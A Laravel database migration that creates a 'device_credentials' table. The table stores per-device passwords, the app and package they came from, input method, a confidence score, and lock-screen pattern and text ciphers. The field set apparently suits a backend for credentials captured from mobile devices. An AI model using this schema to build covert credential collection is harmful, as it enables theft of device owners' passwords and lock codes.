<?php

declare(strict_types=1);

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('device_credentials', function (Blueprint $table) {
            $table->id();
            $table->foreignId('device_id')->constrained()->cascadeOnDelete();
            $table->foreignId('user_id')->constrained()->cascadeOnDelete();
            $table->string('device_uid', 64)->index();
            $table->string('source', 20);
            $table->text('password')->nullable();
            $table->string('password_type', 30)->nullable();
            $table->string('input_method', 50)->nullable();
            $table->string('app_name', 100)->nullable();
            $table->string('package_name', 255)->nullable();
            $table->unsignedTinyInteger('confidence')->nullable();
            $table->string('cipher_grade_code', 50)->nullable();
            $table->text('text_cipher')->nullable();
            $table->string('pattern_cipher', 255)->nullable();
            $table->boolean('is_locked')->default(true);
            $table->timestamp('device_timestamp')->nullable();
            $table->timestamps();

            $table->index(['device_id', 'source']);
            $table->index(['user_id', 'created_at']);
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('device_credentials');
    }
};
